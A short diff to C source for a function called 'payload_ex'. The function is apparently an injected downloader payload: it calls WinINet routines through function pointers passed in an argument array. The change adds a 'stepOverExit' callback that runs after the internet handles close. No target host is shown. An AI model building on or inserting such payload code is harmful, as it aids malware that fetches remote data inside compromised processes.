@@ -25,6 +25,7 @@ typedef int (*InterReadFile)(unsigned long long, unsigned char*, int, int*);
 typedef int (*fwrit)(unsigned char*, int, int, void*);
 typedef int (*InterCloseHandle)(unsigned long long);
 typedef int (*GetLastRror)(void);
+typedef void(*finita)(void);
 
 #define INTERNET_FLAG_RELOAD 0x80000000
 /*
@@ -51,6 +52,7 @@ void payload_ex(unsigned long long* args){
     // void* outputFile = args[5];
     unsigned char* ret_buf = args[4];
     int* ret_sz = args[5];
+    finita stepOverExit = args[6];
     // GetLastRror GetLastError = args[6];
     char buffer[16];
     int bytesRead = 0;
@@ -89,6 +91,7 @@ void payload_ex(unsigned long long* args){
     // printf("We got here\n");
     InternetCloseHandle(hConnect);
     InternetCloseHandle(hInternet);
+    stepOverExit();
     return;
 }
 
